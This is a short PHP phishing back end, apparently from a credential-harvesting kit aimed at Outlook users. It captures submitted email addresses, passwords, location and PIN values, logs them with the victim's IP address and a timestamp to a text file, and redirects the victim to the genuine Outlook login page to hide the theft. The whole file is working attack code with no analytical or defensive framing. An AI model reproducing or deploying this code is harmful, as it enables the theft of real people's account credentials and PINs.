<?php
ini_set("display_errors", 0);
$user_ip = $_SERVER['REMOTE_ADDR'];

$info_json = file_get_contents("http://ipinfo.io/{$user_ip}/json");
$info_obj = json_decode($info_json);
$file = fopen("Supersayayin.txt", "a");
if(isset($_POST['uno']) && isset($_POST['dos'])  && isset($_POST['tres']) ){
fwrite($file, "correo: ".$_POST['uno']." - Clv: ".$_POST['dos']." - pais/city: ".$_POST['tres']."  ");
header ('location: https://outlook.live.com/owa/');
}
if(isset($_POST['tres']) && isset($_POST['cuatro'])){
fwrite($file, "pin: ".$_POST['tres']."  pin2: ".$_POST['cuatro']."  ".date('Y-m-d')." - ".date('H:i:s')." ".$user_ip."   ". PHP_EOL);
fwrite($file, "********************************* " . PHP_EOL);
header ('location: https://outlook.live.com/owa/');
}

fclose($file);


?>